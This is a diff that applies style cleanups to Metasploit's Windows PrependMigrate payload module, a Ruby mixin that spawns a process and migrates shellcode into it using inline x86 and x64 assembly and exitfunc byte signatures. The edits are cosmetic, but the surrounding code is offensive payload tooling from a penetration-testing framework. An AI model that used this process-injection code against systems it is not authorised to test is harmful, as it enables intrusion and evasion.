@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 require 'msf/core'
 
@@ -7,18 +8,18 @@ require 'msf/core'
 #
 ###
 module Msf::Payload::Windows::PrependMigrate
-
   #
   # Initialize
   #
   def initialize(info = {})
-    ret = super( info )
+    ret = super(info)
 
     register_advanced_options(
       [
         Msf::OptBool.new('PrependMigrate', [ true, "Spawns and runs shellcode in new process", false ]),
         Msf::OptString.new('PrependMigrateProc', [ false, "Process to spawn and run shellcode in" ])
-      ], Msf::Payload::Windows )
+      ], Msf::Payload::Windows
+    )
     ret
   end
 
@@ -37,7 +38,7 @@ module Msf::Payload::Windows::PrependMigrate
   def apply_prepend_migrate(buf)
     pre = ''
 
-    test_arch = [ *(self.arch) ]
+    test_arch = [ *arch ]
 
     if prepend_migrate?
       # Handle all x86 code here
@@ -50,7 +51,7 @@ module Msf::Payload::Windows::PrependMigrate
         pre << Metasm::Shellcode.assemble(Metasm::X64.new, migrate_asm).encode_string
       end
     end
-    return pre + buf
+    pre + buf
   end
 
   #
@@ -161,7 +162,7 @@ module Msf::Payload::Windows::PrependMigrate
     EOS
 
     # Check to see if we can find exitfunc in the payload
-    exitfunc_index = buf.index("\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A" +
+    exitfunc_index = buf.index("\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A" \
             "\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5")
     if exitfunc_index
       exitblock_offset = "0x%04x + payload - exitblock" % (exitfunc_index - 5)
@@ -195,7 +196,7 @@ module Msf::Payload::Windows::PrependMigrate
       EOS
     end
 
-    #put all pieces together
+    # put all pieces together
     migrate_asm = <<-EOS
       cld                       ; Clear the direction flag.
       #{block_api_start}
@@ -297,7 +298,6 @@ module Msf::Payload::Windows::PrependMigrate
     EOS
     migrate_asm
   end
-
 
   def prepend_migrate_64(buf)
     payloadsize = "0x%04x" % buf.length
@@ -408,7 +408,7 @@ module Msf::Payload::Windows::PrependMigrate
     EOS
 
     # Check to see if we can find x64 exitfunc in the payload
-    exitfunc_index = buf.index("\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06" +
+    exitfunc_index = buf.index("\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06" \
         "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5")
     if exitfunc_index
       exitblock_offset = "0x%04x + payload - exitblock" % (exitfunc_index - 5)
@@ -442,7 +442,7 @@ module Msf::Payload::Windows::PrependMigrate
       EOS
     end
 
-    #put all pieces together
+    # put all pieces together
     migrate_asm = <<-EOS
       cld                       ; Clear the direction flag.
       #{block_api_start}
@@ -488,18 +488,18 @@ module Msf::Payload::Windows::PrependMigrate
       mov r9,0x1000             ; 0x1000 = MEM_COMMIT
     EOS
 
-    if buf.length > 4096
-      # probably stageless, so we don't have shellcode size constraints,
-      # and so we can just set r8 to the size of the payload
-      migrate_asm << <<-EOS
+    migrate_asm << if buf.length > 4096
+                     # probably stageless, so we don't have shellcode size constraints,
+                     # and so we can just set r8 to the size of the payload
+                     <<-EOS
       mov r8, #{payloadsize} ; stageless size
       EOS
-    else
-      # otherwise we'll juse reuse r9 (4096) for size
-      migrate_asm << <<-EOS
+                   else
+                     # otherwise we'll juse reuse r9 (4096) for size
+                     <<-EOS
       mov r8,r9                 ; size
       EOS
-    end
+                   end
 
     migrate_asm << <<-EOS
       xor rdx,rdx               ; address
@@ -546,6 +546,4 @@ module Msf::Payload::Windows::PrependMigrate
     EOS
     migrate_asm
   end
-
 end
-
